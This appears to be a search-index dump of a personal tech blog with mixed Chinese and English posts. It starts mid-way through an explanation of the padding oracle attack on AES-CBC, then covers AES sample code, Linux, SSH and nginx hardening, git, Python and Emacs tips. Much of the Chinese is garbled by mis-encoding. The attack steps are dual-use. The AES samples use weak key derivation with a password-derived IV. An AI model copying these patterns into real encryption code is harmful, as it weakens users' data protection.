æµ‹è¯•å³å¯ã€‚å¦‚æ­¤æœ€å¤šæµ‹è¯• 15 æ¬¡ï¼Œå³å¯ç¡®å®š P2â€™[15] çš„å€¼ã€‚æ­¥éª¤å¯å½’çº³å¦‚ä¸‹ï¼š\ni = 14, C1â€™[i] = 1 PaddingOracle(C1â€™ + C2) æ˜¯å¦æˆåŠŸï¼ŸæˆåŠŸè·³åˆ°ç¬¬ 4 æ­¥ï¼Œå¦åˆ™ç»§ç»­ C1â€™[i] = 0, i -= 1, å¦‚æœ i \u003c 0ï¼Œåˆ™è·³è½¬ç¬¬ 5 æ­¥ï¼›å¦åˆ™ C1â€™[i] = 1ï¼Œé‡å¤ç¬¬ 2 æ­¥ æ ¹æ® PKCS7Padding çš„å®šä¹‰ï¼Œå¯ç¡®å®š P2â€™[15] çš„å€¼ä¸º 16 - i - 1ï¼Œç»“æŸ æ ¹æ® PKCS7Padding çš„å®šä¹‰ï¼Œå¯ç¡®å®š P2â€™[15] çš„å€¼ä¸º 16ï¼Œç»“æŸ ç¨‹åºå®ç° ä½œä¸ºç»ƒä¹ å’Œæµ‹è¯•ï¼Œè¿™é‡Œç”¨ Python è¯­è¨€å®ç°äº†ä¸€ä¸ª Padding Oracle Attack çš„ Demoï¼Œè§ padding-oracle-attack ã€‚\nå‚è€ƒ The Padding Oracle Attack - why crypto is terrifying Padding oracle attacks: in depth ç¬¬ä¸€ç¯‡æ–‡ç« å†™çš„æ¯”è¾ƒç”ŸåŠ¨æ˜“ç†è§£ï¼Œå›¾æ–‡é…åˆçš„å¾ˆå¥½ï¼ˆæœ¬æ–‡å›¾ç‰‡å°±æ˜¯å¼•è‡ªè¿™é‡Œï¼‰ï¼Œç¼ºç‚¹æ˜¯æ²¡æœ‰æåˆ° P2â€™[15] å€¼çš„ç¡®å®šï¼Œç”šè‡³ç›´æ¥æ–­å®š P2â€™[15] == 1ï¼Œä¸å¤ªä¸¥è°¨ã€‚ç»æˆ‘ä¸ªäººæµ‹è¯•æ˜¯æœ‰å¯èƒ½å‡ºç°å…¶ä»–å€¼çš„ã€‚\nç¬¬äºŒç¯‡æ–‡ç« å†™çš„æ¯”è¾ƒä¸¥è°¨ã€æ¯”è¾ƒå½¢å¼åŒ–ï¼Œä½†ä¹Ÿæ¯”è¾ƒæ¯ç‡¥ï¼Œæ²¡é‚£ä¹ˆå½¢è±¡ç”ŸåŠ¨ã€‚ä¸è¿‡è¿™ç¯‡æ–‡ç« æåˆ°äº† P2â€™[15] çš„ä¸ç¡®å®šæ€§ï¼Œè€Œä¸”ç®€å•ä»‹ç»äº†è§£å†³åŠæ³•ï¼ˆåœ¨Backtrackingä¸€èŠ‚ä¸­æœ‰ç®€å•è¯´æ˜ï¼‰ï¼Œä½†æœªåšè¯¦ç»†é˜è¿°ã€‚\né™„å½• AES with PBKDF2 \u0026 PKCS7Padding \u0026 CBC mode in Swift (iOS):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 enum CryptorError: ErrorType { case PasswordError case RandomSaltError case AllocError case DeriveDataError case EncryptError case UnknownError } internal func AESEncrypt(plaintext: NSData, password: String) throws -\u003e (NSData, NSData) { guard let passwordData: NSData = password.dataUsingEncoding(NSUTF8StringEncoding, allowLossyConversion: false) else { throw(CryptorError.PasswordError) } let operation = CCOperation(kCCEncrypt) let options = UInt32(kCCOptionPKCS7Padding) let palintextLen = Int(plaintext.length) let plaintextBytes = UnsafePointer\u003cVoid\u003e(plaintext.bytes) let outBuffer = NSMutableData(length: Int(palintextLen) + algorithm.requiredBlockSize())! let outBufferPtr = UnsafeMutablePointer\u003cVoid\u003e(outBuffer.mutableBytes) let outBufferLen = size_t(outBuffer.length) var bytesDecrypted = Int(0) let SALT_LEN = 16 guard let randomSalt = SymmetricCryptor.randomDataOfLength(SALT_LEN) else { throw(CryptorError.RandomSaltError) } let saltBytes = UnsafePointer\u003cUInt8\u003e(randomSalt.bytes) let saltLen = randomSalt.length guard let derivedData = NSMutableData(length: 32) else { throw(CryptorError.AllocError) } let derivationResult = CCKeyDerivationPBKDF(CCPBKDFAlgorithm(kCCPBKDF2), UnsafePointer\u003cInt8\u003e(passwordData.bytes), passwordData.length, saltBytes, saltLen, CCPseudoRandomAlgorithm(kCCPRFHmacAlgSHA1), 1000, UnsafeMutablePointer\u003cUInt8\u003e(derivedData.mutableBytes), derivedData.length) guard Int32(derivationResult) == Int32(kCCSuccess) else { throw(CryptorError.DeriveDataError) } let derivedKey = derivedData.subdataWithRange(NSMakeRange(0, 16)) let derivedIV = derivedData.subdataWithRange(NSMakeRange(16, 16)) // Perform operation let cryptStatus = CCCrypt( operation, // Operation algorithm.ccAlgorithm(), // Algorithm options, // Options UnsafePointer\u003cVoid\u003e(derivedKey.bytes), // key data derivedKey.length, // key length UnsafePointer\u003cVoid\u003e(derivedIV.bytes), // IV buffer plaintextBytes, // input data palintextLen, // input length outBufferPtr, // output buffer outBufferLen, // output buffer length \u0026bytesDecrypted) // length of bytes decrypted guard Int32(cryptStatus) == Int32(kCCSuccess) else { throw(CryptorError.EncryptError) } outBuffer.length = bytesDecrypted // Adjust buffer size to real bytes return (randomSalt, outBuffer as NSData) } AES with PBKDF2 \u0026 PKCS7Padding \u0026 CBC mode in Python:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 from Crypto.Cipher import AES from Crypto import Random from pbkdf2 import PBKDF2 PBKDF2_ROUNDS = 1000 def AESEncrypt(plaintext, password): # padding bs = AES.block_size padding_len = bs - len(plaintext) % bs plaintext += chr(padding_len) * padding_len # prepare parameters salt = Random.new().read(16) derived = PBKDF2(password, salt, PBKDF2_ROUNDS).read(32) key, iv = derived[:16], derived[16:] # encrypt cipher = AES.new(key, AES.MODE_CBC, iv) cyphertext = cipher.encrypt(plaintext) return salt, cyphertext def AESDecrypt(cyphertext, password, salt): # derive key \u0026 iv derived = PBKDF2(password, salt, PBKDF2_ROUNDS).read(32) key, iv = derived[:16], derived[16:] # decrypt cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = cipher.decrypt(cyphertext) # unpadding padding_len = ord(plaintext[-1]) return plaintext[:-padding_len] ","description":"","tags":["security","algorithm"],"title":"Padding Oracle Attack","uri":"/posts/padding-oracle-attack/"},{"categories":null,"content":"Creating a 1000MB ramdisk:\n1 2 3 4 5 6 7 8 9 10 11 12 $ hdiutil attach -nomount ram://$((2048 * 1000)) /dev/disk3 $ diskutil eraseVolume HFS+ RAMDisk /dev/disk3 Started erase on disk3 Unmounting disk Erasing Initialized /dev/rdisk3 as a 1000 MB case-insensitive HFS Plus volume Mounting disk Finished erase on disk3 RAMDisk $ hdiutil detach /dev/disk3 ","description":"","tags":["macos","tools"],"title":"Create Ramdisk on macOS","uri":"/posts/create-ramdisk-on-macos/"},{"categories":null,"content":"ssh Modify /etc/ssh/sshd_config:\n1 2 3 4 5 6 7 8 9 10 11 12 13 # Disable root login PermitRootLogin no # Change the default port Port 12345 # Enable login with key RSAAuthentication yes PubkeyAuthentication yes # Disable login with password UsePAM no PasswordAuthentication no After that, remember to restart sshd: sudo /etc/init.d/ssh restart (for Debian/Ubuntu) or sudo service sshd restart (for CentOS).\niptables Refer to https://wiki.debian.org/iptables* Create the file /etc/iptables.test.rules, and enter rules:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 *filter # Allows all loopback (lo0) traffic and drop all traffic to 127/8 that doesn't use lo0 -A INPUT -i lo -j ACCEPT -A INPUT ! -i lo -d 127.0.0.0/8 -j REJECT # Accepts all established inbound connections -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT # Allows all outbound traffic # You could modify this to only allow certain traffic -A OUTPUT -j ACCEPT # Allows HTTP and HTTPS connections from anywhere (the normal ports for websites) -A INPUT -p tcp --dport 80 -j ACCEPT -A INPUT -p tcp --dport 443 -j ACCEPT # Allows SSH connections # The --dport number is the same as in /etc/ssh/sshd_config -A INPUT -p tcp -m state --state NEW --dport 22 -j ACCEPT # Now you should read up on iptables rules and consider whether ssh access # for everyone is really desired. Most likely you will only allow access from certain IPs. # Allow ping # note that blocking other types of icmp packets is considered a bad idea by some # remove -m icmp --icmp-type 8 from this line to allow all kinds of icmp: # \u003chttps://security.stackexchange.com/questions/22711\u003e -A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT # log iptables denied calls (access via 'dmesg' command) -A INPUT -m limit --limit 5/min -j LOG --log-prefix \"iptables denied: \" --log-level 7 # Reject all other inbound - default deny unless explicitly allowed policy: -A INPUT -j REJECT -A FORWARD -j REJECT COMMIT Apply these rules:\n1 sudo iptables-restore \u003c /etc/iptables.test.rules And see the difference:\n1 iptables -L Save the rules:\n1 iptables-save \u003e /etc/iptables.up.rules Create file /etc/network/if-pre-up.d/iptables, and add these lines to it:\n1 2 #!/bin/sh /sbin/iptables-restore \u003c /etc/iptables.up.rules Add executable permision for the file:\nchmod +x /etc/network/if-pre-up.d/iptables\nTo check who is listening on TCP port 12345:\nlsof -n -i4TCP:12345 | grep LISTEN\nnginx Modify the file nginx.conf:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 http { # Hide nginx version information server_tokens off; # Catch all requests with wrong host and return 444 status server { listen 80 default_server; listen [::]:80 default_server; listen 443 ssl default_server; listen [::]:443 ssl default_server; return 444; } } ","description":"","tags":["linux","security"],"title":"Linux Security Tips","uri":"/posts/linux-security-tips/"},{"categories":null,"content":"å¦‚ä½•ç ´è§£ä¸€ä¸ª ELF æ–‡ä»¶ï¼šhackme: Deconstructing an ELF File\nå‡ ç‚¹å¯ç¤ºï¼š\nç¼–è¯‘æ—¶è¦ä½¿ç”¨ strip é€‰é¡¹ é¿å…åœ¨ä»£ç ä¸­ä½¿ç”¨å­—ç¬¦ä¸²å¸¸é‡å­˜æ”¾æ•æ„Ÿä¿¡æ¯ï¼Œstrings å·¥å…·å¯ä»¥è½»æ˜“ dump å‡ºæ¥ åœ¨è°ƒç”¨åº“å‡½æ•°ã€ç³»ç»Ÿå‡½æ•°æ—¶ï¼Œé¿å…åœ¨å‚æ•°ä¸­ä¼ é€’æ˜æ–‡çš„æ•æ„Ÿä¿¡æ¯ï¼Œ ltrace, strace ç­‰å·¥å…·å¯ä»¥è½»æ˜“è°ƒè¯•å‡ºæ¥ å¦å¤–ï¼Œåœ¨Javaä»£ç ä¸­ï¼Œä¹Ÿè¦é¿å…ä½¿ç”¨æ˜æ–‡å­—ç¬¦ä¸²ä¿å­˜æ•æ„Ÿä¿¡æ¯ï¼Œå°¤å…¶æ˜¯ä¸è¦ç”¨ String æ¥ä¿å­˜å¯†ç ï¼ŒåŸå› ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š\nString åœ¨ java ä¸­æ˜¯ä¸å¯å˜çš„ï¼Œè€Œä¸”ä¼šä¸€ç›´ä¿ç•™åœ¨å†…å­˜ä¸­ï¼Œç›´åˆ°åƒåœ¾æ”¶é›†å™¨å°†å…¶å›æ”¶ã€‚è€Œç”±äºå­—ç¬¦ä¸²è¢«æ”¾åœ¨å­—ç¬¦ä¸²ç¼“å†²æ± ä¸­ä»¥æ–¹ä¾¿é‡å¤ä½¿ç”¨ï¼Œæ‰€ä»¥å®ƒå°±å¯èƒ½åœ¨å†…å­˜ä¸­è¢«ä¿ç•™å¾ˆé•¿æ—¶é—´ï¼› å¦‚æœä½¿ç”¨ char [] æ¥ä¿å­˜å¯†ç ï¼Œåœ¨ç”¨å®Œä¹‹åå¯ä»¥ç«‹å³å°†å…¶ä¸­æ‰€æœ‰çš„å…ƒç´ æ¸…ç©ºã€‚æ‰€ä»¥å°†å¯†ç ä¿å­˜åˆ°å­—ç¬¦æ•°ç»„ä¸­å¾ˆæ˜æ˜¾çš„é™ä½äº†å¯†ç è¢«çªƒå–çš„é£é™©ï¼› å‚è€ƒ ä¸ºä»€ä¹ˆä½¿ç”¨å­—ç¬¦æ•°ç»„ä¿å­˜å¯†ç æ¯”ä½¿ç”¨Stringä¿å­˜å¯†ç æ›´å¥½ï¼Ÿã€‚\n","description":"","tags":["security"],"title":"Security Tipsï¼šELF ç ´è§£åŠå‡ ç‚¹å¯ç¤º","uri":"/posts/security-tips-elf-hack/"},{"categories":null,"content":" Bloom Filter æ˜¯ç”± Bloom åœ¨ 1970 å¹´æå‡ºçš„ä¸€ç§å¤šå“ˆå¸Œå‡½æ•°æ˜ å°„çš„å¿«é€ŸæŸ¥æ‰¾ç®—æ³•ã€‚\né€šå¸¸åº”ç”¨åœ¨ä¸€äº›éœ€è¦å¿«é€Ÿåˆ¤æ–­æŸä¸ªå…ƒç´ æ˜¯å¦å±äºé›†åˆï¼Œä½†æ˜¯å¹¶ä¸ä¸¥æ ¼è¦æ±‚ 100% æ­£ç¡®çš„åœºåˆã€‚\nHashMap çš„é—®é¢˜ HashMap å…·æœ‰ O(1) çš„æŸ¥æ‰¾å¤æ‚åº¦ï¼Œä½†ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼šå†…å­˜åˆ©ç”¨ç‡ä¸é«˜ã€‚\nå¦‚æœéœ€è¦æŸ¥è¯¢çš„æ˜¯æµ·é‡æ•°æ®ï¼Œä½¿ç”¨ HashMap å°±å˜å¾—ä¸å¤ªç°å®ã€‚\nBloom Filter Bloom filter æ˜¯ä¸€ç§æ¦‚ç‡å‹æ•°æ®ç»“æ„ï¼Œå…·å¤‡å¦‚ä¸‹å‡ ä¸ªç‰¹ç‚¹ï¼š\né«˜æ•ˆçš„æ’å…¥ã€æŸ¥è¯¢ æé«˜çš„ç©ºé—´åˆ©ç”¨ç‡ å¯ä»¥å‘Šè¯‰ä½ ï¼šæŸæ¡è®°å½•ä¸€å®šä¸å­˜åœ¨ï¼Œæˆ–è€…æœ‰å¯èƒ½å­˜åœ¨ å®ç°åŸç† å¦‚ä¸Šå›¾ï¼Œbloom filter åº•å±‚ç»“æ„æ˜¯ä¸€ä¸ª bit æ•°ç»„ï¼ˆä¹Ÿå¯ä»¥æ˜¯å¤šä¸ªï¼‰ã€‚\næ’å…¥ï¼šé‡‡ç”¨å¤šä¸ªç‹¬ç«‹çš„ hash å‡½æ•°ï¼Œåˆ†åˆ«è®¡ç®—è¯¥è®°å½•çš„ hash codeï¼Œå¹¶å°† hash code æ‰€æŒ‡å‘çš„ bit ä½è®¾ç½®ä¸º 1ï¼›\næŸ¥è¯¢ï¼šé‡‡ç”¨å¤šä¸ªç‹¬ç«‹çš„ hash å‡½æ•°ï¼Œåˆ†åˆ«è®¡ç®—è¯¥è®°å½•çš„ hash code\nå¦‚æœå…¶ä¸­æŸä¸ª hash code æŒ‡å‘çš„ bit ä½ â‰  1ï¼Œåˆ™è¯¥è®°å½•ä¸€å®šä¸å­˜åœ¨ï¼› å¦‚æœæ¯ä¸ª hash code æŒ‡å‘çš„ bit ä½éƒ½ä¸º 1ï¼Œåˆ™è¯¥è®°å½•å¯èƒ½å­˜åœ¨ã€‚ ä½¿ç”¨åœºæ™¯ ä¾‹å¦‚ï¼š\næµè§ˆå™¨ç”¨æ¥å¿«é€Ÿç¡®å®šæŸä¸ª URL æ˜¯å¦å­˜åœ¨æœ¬åœ°ç¼“å­˜ï¼› çˆ¬è™«ç¨‹åºç”¨æ¥å¿«é€Ÿç¡®å®šæŸä¸ª URL æ˜¯å¦è¢«çˆ¬å–è¿‡ï¼› æœç´¢å¼•æ“ç”¨æ¥å¿«é€Ÿç¡®å®šæŸä¸ª URL æ˜¯å¦è¢«ç´¢å¼•è¿‡ã€‚ ","description":"","tags":["algorithm"],"title":"Bloom Filter å¸ƒéš†è¿‡æ»¤å™¨","uri":"/posts/bloom-filter/"},{"categories":null,"content":"å‡½æ•°å·¥å…· functools ç¼“å­˜ç±»è£…é¥°å™¨ @cache\nç”¨äºè‡ªåŠ¨ç¼“å­˜å‡½æ•°çš„è¿”å›ç»“æœï¼ˆå³å…¶ä»–è¯­è¨€å¸¸è§çš„ memoizeï¼‰ã€‚\nä½¿ç”¨èµ·æ¥éå¸¸ç®€å•ï¼Œç»™å‡½æ•°å¢åŠ  @cache è£…é¥°å™¨ï¼ˆDecoratorï¼‰å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 from functools import cache @cache def factorial(n): return n * factorial(n-1) if n else 1 \u003e\u003e\u003e factorial(10) # æ— ç¼“å­˜ç»“æœ, è§¦å‘ 11 æ¬¡é€’å½’è°ƒç”¨ 3628800 \u003e\u003e\u003e factorial(5) # ç›´æ¥è¿”å›ç¼“å­˜ç»“æœ 120 \u003e\u003e\u003e factorial(12) # è§¦å‘ 2 æ¬¡é€’å½’è°ƒç”¨, å…¶ä½™ 10 æ¬¡ç›´æ¥ä½¿ç”¨ç¼“å­˜çš„ç»“æœ 479001600 ç”±äºç¼“å­˜æ˜¯é€šè¿‡å­—å…¸æ¥å®ç°çš„ï¼Œkey å°±æ˜¯å‡½æ•°çš„å‚æ•°ï¼Œæ‰€ä»¥ï¼Œå‚æ•°å¿…é¡»æ˜¯ hashable çš„ã€‚\né‚£å¦‚æœæƒ³ç¼“å­˜å±æ€§ï¼ˆpropertyï¼‰å‘¢ï¼Ÿå¾ˆç®€å•ï¼Œç›´æ¥åœ¨ @property åŸºç¡€ä¸Šï¼Œå åŠ ä¸€ä¸ª @cache å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 from functools import cache import statistics class DataSet: def __init__(self, sequence_of_numbers): self._data = sequence_of_numbers @property @cache def stdev(self): return statistics.stdev(self._data) @cached_property\nä¸Šè¿°è¿™ä¸ªæ˜¯åªè¯»å±æ€§ï¼Œå¦‚æœæƒ³æ”¹æˆå¯å†™å±æ€§å‘¢ï¼Ÿfunctools è¿˜æä¾›äº†ä¸€ä¸ªå¯å†™çš„ç‰ˆæœ¬ @cached_propertyï¼š\n1 2 3 4 5 6 7 8 9 10 11 from functools import cached_property import statistics class DataSet: def __init__(self, sequence_of_numbers): self._data = sequence_of_numbers # è¯¥å±æ€§æ˜¯å¯å†™ç‰ˆæœ¬ @cached_property def stdev(self): return statistics.stdev(self._data) @lru_cache\nå¦‚æœæƒ³é™åˆ¶ç¼“å­˜çš„ size å‘¢ï¼Ÿå¯ä»¥ä½¿ç”¨ @lru_cache ï¼š\n1 2 3 4 5 6 7 8 9 10 # maxsize ä¸ºå¯é€‰å‚æ•°ï¼Œé»˜è®¤ä¸º 128 @lru_cache(maxsize=32) def get_pep(num): 'Retrieve text of a Python Enhancement Proposal' resource = 'https://peps.python.org/pep-%04d/' % num try: with urllib.request.urlopen(resource) as s: return s.read() except urllib.error.HTTPError: return 'Not Found' å’Œ @cache ç±»ä¼¼ï¼Œå‚æ•°ä¹Ÿå¿…é¡»æ˜¯ hashable çš„ã€‚\nPartial object functools.partial å‡½æ•°å¯ä»¥åˆ›å»ºä¸€ä¸ª partial object ï¼Œ partial object æ˜¯ä¸€ä¸ªå¯è°ƒç”¨çš„å¯¹è±¡ã€‚\nå­—é¢ä¸Šç¨å¾®æœ‰ç‚¹æŠ½è±¡ï¼Œçœ‹ä¸ªä¾‹å­å°±å¾ˆæ¸…æ™°äº†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 import functools def add(a, b): return a + b plus3 = functools.partial(add, 3) plus3(1) # out: 4 plus3(7) # out: 10 é—­åŒ…ç¤ºä¾‹ï¼šå¯¹å‡½æ•°è¿›è¡Œæ±‚å¯¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 def derivative(f): # Computes the numerical derivative of a function. def df(x, dx=1e-6): return (f(x+dx) - f(x)) / dx return df def g(x): return x ** 2 # first derivative of g dg = derivative(g) # second derivative of g d2g = derivative(dg) Iterate over a list 2 items at a time 1 2 for (c1, c2) in zip(s[0::2], s[1::2]): print c1, c2 No-copy version:\n1 2 3 4 from itertools import izip, islice for (c1, c2) in izip(islice(s, 0, None, 2), islice(s, 1, None, 2)): print c1, c2 Hex â†”Â Bin Hex string to bin string:\n1 2 s = 'bd2866849ae03b59861d40dd8bb0d4' ''.join([chr(int(''.join(two), 16)) for two in zip(s[0::2], s[1::2])]) Bin string to hex string:\n1 2 binstr = '\\\\xbd(f\\\\x84\\\\x9a\\\\xe0;Y\\\\x86\\\\x1d@\\\\xdd\\\\x8b\\\\xb0\\\\xd4' ''.join(('{0:02x}'.format(ord(c)) for c in binstr)) ","description":"","tags":["python"],"title":"Python Tips","uri":"/posts/python-tips/"},{"categories":null,"content":" æŸ¥çœ‹æ–‡ä»¶å±æ€§\n1 2 $ lsattr filename ----i-------- filename å­—æ¯ i æ„å‘³ç€è¯¥æ–‡ä»¶æ˜¯ä¸€ä¸ª Immutable ï¼ˆåªè¯»ï¼‰æ–‡ä»¶ã€‚\nè®¾ç½®åªè¯»å±æ€§ï¼š\n1 $ chattr +i filename å»æ‰åªè¯»å±æ€§ï¼š\n1 $ chattr -i filename ","description":"","tags":["linux","tools"],"title":"Linux Tips: åªè¯»æ–‡ä»¶ Immutable files","uri":"/posts/linux-tips-immutable-files/"},{"categories":null,"content":"å®‰å…¨çš„å¼ºæ¨ push â€”froce-with-lease æ¨èä½¿ç”¨æ›´å®‰å…¨çš„ force push å‘½ä»¤ï¼š\n1 git push --force-with-lease è¯¥ç‰ˆæœ¬å¯ä»¥ç¡®ä¿ï¼Œä¸ä¼šè¦†ç›–å…¶ä»–äººçš„æäº¤ã€‚å¦‚æœæœ‰å°šæœª fetch çš„è¿œç¨‹æäº¤ï¼Œè¯¥å‘½ä»¤ä¼šæç¤ºå¹¶ä¸­æ­¢æ‰§è¡Œã€‚\nå®šä½æŸä¸ª commit åˆå…¥çš„ç‰ˆæœ¬ git name-rev \u003ccommit-id\u003e\næŸ¥çœ‹æœ¬åœ°å°šæœª push çš„æäº¤ git cherry -v\næŒ‡å®šè¦æ¯”è¾ƒçš„è¿œç¨‹åˆ†æ”¯ï¼š\ngit cherry -v origin/somebranch\nmerge \u0026 rebase æ‰§è¡Œ git checkout --ours path ï¼ˆä»¥åŠ git checkout --theirs path ï¼‰å‘½ä»¤æ—¶ï¼Œè¦æ ¼å¤–æ³¨æ„ï¼Œè¿™é‡Œçš„ ours å’Œ theirs å®¹æ˜“ææ··ï¼š\nåœ¨åš merge æ—¶ï¼š\n- *ours* æŒ‡å½“å‰çš„åˆ†æ”¯ - *theirs* æŒ‡è¦åˆå…¥çš„ç›®æ ‡åˆ†æ”¯ åœ¨åš rebase æ—¶ï¼š\n- *ours* æŒ‡ rebase å‚æ•°æ‰€æŒ‡å®šçš„åˆ†æ”¯ - *theirs* æŒ‡å½“å‰åœ¨åš rebase çš„åˆ†æ”¯ åŸå› è§£é‡Šï¼šå› ä¸º rebase æ˜¯é€šè¿‡ä¸€ç³»åˆ—çš„ cherry-pick æ¥å®ç°çš„ï¼Œæ˜¯æŠŠå½“å‰åˆ†æ”¯çš„ commit cherry-pick åˆ°æŒ‡å®šåˆ†æ”¯ã€‚å› æ­¤ï¼Œåœ¨ cherry-pick çš„è¿‡ç¨‹ä¸­ï¼ŒæŒ‡å®šçš„åˆ†æ”¯è¢«è§†ä¸º oursï¼Œè€Œè¢« rebase çš„å½“å‰åˆ†æ”¯è¢«è§†ä¸º theirs ã€‚\nHEAD~ å’Œ HEAD^ çš„åŒºåˆ«\nTags push tags: git push --tags\nrename tag:\n1 2 3 4 5 git tag new old git tag -d old # old å‰é¢çš„ `:` ä¼šä»è¿œç¨‹ä»“åº“ä¸­åˆ é™¤è¯¥ tag git push origin new :old Git ä»£ç†é…ç½® .gitconfig é…ç½®ï¼š\n1 2 3 4 [user] email = username@gmail.com [http] proxy = localhost:7777 .gitconfig æ–‡ä»¶å¯æ”¾åœ¨å®¶ç›®å½•ä¸‹ï¼ˆå½±å“å½“å‰ç”¨æˆ·ï¼‰ï¼Œäº¦å¯æ”¾åœ¨å•ä¸ª git ä»“åº“ä¸‹ï¼ˆä»…å½±å“å½“å‰ä»“åº“ï¼‰ã€‚\nä¹Ÿå¯ä»¥é‡‡ç”¨å¦‚ä¸‹å‘½ä»¤æ¥è®¾ç½®ä»£ç†ï¼š\n1 2 3 4 5 # æ˜¯çš„ï¼Œæ”¯æŒ socks5 åè®® git config --global http.proxy 'socks5://127.0.0.1:7070' # å–æ¶ˆä»£ç† git config --global --unset http.proxy å‚è€ƒè¿™ç¯‡æ–‡æ¡£ï¼Œè™½ç„¶åå­—å«Â http.proxy ï¼Œä½†å…¶å®ä¹Ÿæ”¯æŒ httpsã€‚\nå¦å¤–ï¼Œå¦‚æœå¸Œæœ›åŸŸåä¹Ÿé€šè¿‡ä»£ç†æ¥è§£æçš„è¯ï¼Œåˆ™åº”è¯¥å°† socks5 æ›¿æ¢ä¸º socks5h ã€‚\nGit through ssh 1 2 # git through ssh git remote add origin ssh://user@my.git.svr/path/to/repo git filter-branch // TODO\nGit branching model å‚è€ƒï¼šhttps://nvie.com/posts/a-successful-git-branching-model/\n","description":"","tags":["tools","git"],"title":"Git Tips","uri":"/posts/git-tips/"},{"categories":null,"content":"Debian ä¸Šå®‰è£…å­—ä½“ï¼Œå°±è¿™ä¹ˆç®€å•ï¼š\n1 2 3 mkdir ~/.fonts cp simsun.ttf ~/.fonts/ sudo fc-cache -fv æå®šï¼ä¼˜é›…ï½\n","description":"","tags":["tools","linux"],"title":"Linux Tips: å®‰è£…æ–°å­—ä½“","uri":"/posts/linux-tips-setup-fonts/"},{"categories":null,"content":"æœ‰æ—¶å¸Œæœ›è®¡ç®—æœºåœ¨å®ŒæˆæŸé¡¹ä»»åŠ¡åè‡ªåŠ¨å…³æœºï¼Œä¾‹å¦‚ï¼Œæ­£åœ¨ä½¿ç”¨ git ä¸‹è½½è¾ƒå¤§çš„ä»£ç ä»“åº“ï¼Œåˆæˆ–è€…æ­£ç”¨ wget ä¸‹è½½å¤§æ–‡ä»¶ï¼Œå¦‚æœæ­¤æ—¶éœ€è¦ç¦»å¼€ï¼Œåˆä¸æƒ³ä¸­æ–­ä»»åŠ¡ï¼Œæœ€å¥½çš„åŠæ³•å°±æ˜¯è®¾ç½®å…¶å®Œæˆåè‡ªåŠ¨å…³æœºäº†ã€‚\nè¿™é‡Œä»‹ç»ä¸€ç§åŠæ³•ï¼Œåˆ©ç”¨ cron æœºåˆ¶ç›‘æ§ä»»åŠ¡çš„å®Œæˆæƒ…å†µï¼Œå¹¶åœ¨ä»»åŠ¡ç»“æŸåï¼Œæ‰§è¡Œå…³æœºæŒ‡ä»¤ã€‚\nè·å–ä»»åŠ¡çš„ pid :\n1 ps -eo pid,command | grep git ç¼–å†™å…³æœºè„šæœ¬ï¼Œå‡è®¾å­˜æ”¾åœ¨æ–‡ä»¶ /path/to/halt-if-gone ä¸­ï¼ˆä¸è¦å¿˜äº†åŠ ä¸Šå¯æ‰§è¡Œæƒé™ï¼‰:\n1 2 3 4 5 6 #! /bin/bash if [[ $# -eq 1 ]]; then # 2åˆ†é’Ÿåå…³æœºï¼Œè®©ä½ æœ‰åæ‚”çš„ä½™åœ° ps -eo pid | grep $1 \u0026\u003e /dev/null || /sbin/shutdown -h +2 fi è®¾ç½® cron æŒ‡ä»¤ï¼Œæ¯15åˆ†é’Ÿæ‰«æä¸€æ¬¡ï¼ˆå½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥ç¼©çŸ­æ‰«æé—´éš”ï¼‰::\n1 2 # è¯·å°† $TASK_PID æ›¿æ¢ä¸ºä½ è¦ç­‰å¾…çš„ä»»åŠ¡çš„ pid */15 * * * * /path/to/halt-if-gone $TASK_PID ","description":"","tags":["tools","linux"],"title":"Linux Tips: ä»»åŠ¡å®Œæˆåè‡ªåŠ¨å…³æœº","uri":"/posts/linux-tips-auto-shutdown-after-task-done/"},{"categories":null,"content":"Macro å®å½•åˆ¶ \u0026 å›æ”¾ å¼€å§‹å½•åˆ¶ï¼š C-x ( ç»“æŸå½•åˆ¶ï¼š C-x ) å›æ”¾å®ï¼š C-x e Regexp ç›¸å…³ M-x count-matches ç»Ÿè®¡æ­£åˆ™åŒ¹é…åˆ°çš„æ¬¡æ•°\nC-M-s æ­£åˆ™æœç´¢\nM-x replace-regexp æ­£åˆ™æ›¿æ¢\n1 2 3 4 # ç¤ºä¾‹ï¼šåœ¨æ¯è¡Œåé¢è¿½åŠ æ–‡æœ¬ xyz M-x replace-regexp RET $ RET xyz RET mauth\\([^-]\\) â†’ mauth-front\\1 C-M-% or query-replace-regexp æ­£åˆ™æŸ¥æ‰¾ \u0026 æ›¿æ¢\né«˜çº§ç”¨æ³•ç¤ºä¾‹ï¼š\n1 2 # æ‰§è¡Œæ›¿æ¢ï¼šauth\\b\\([^-]\\) â†’ auth-front\\1 C-M-% auth\\b\\([^-]\\) RET auth-front\\1 RET ä¸Šè¿°ç¤ºä¾‹çš„æ‰§è¡Œæ•ˆæœï¼š\né¦–å…ˆåŒ¹é…åˆ°æ‰€æœ‰ auth å¼€å¤´çš„å•è¯ï¼Œå¹¶ä¸”æ’é™¤æ‰ â€œauth-â€ çš„ caseï¼› å°†åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ â€œauth:â€ã€â€œauth+â€ ç­‰ï¼Œåé¢æ’å…¥ â€œ-frontâ€ï¼Œä¾‹å¦‚æ›¿æ¢ä¸ºï¼šâ€auth-front:â€ã€â€auth-front+â€ M-s o pattern RET åˆ—å‡ºæ‰€æœ‰åŒ¹é…è¡Œ\nC-u M-s o pattern RET 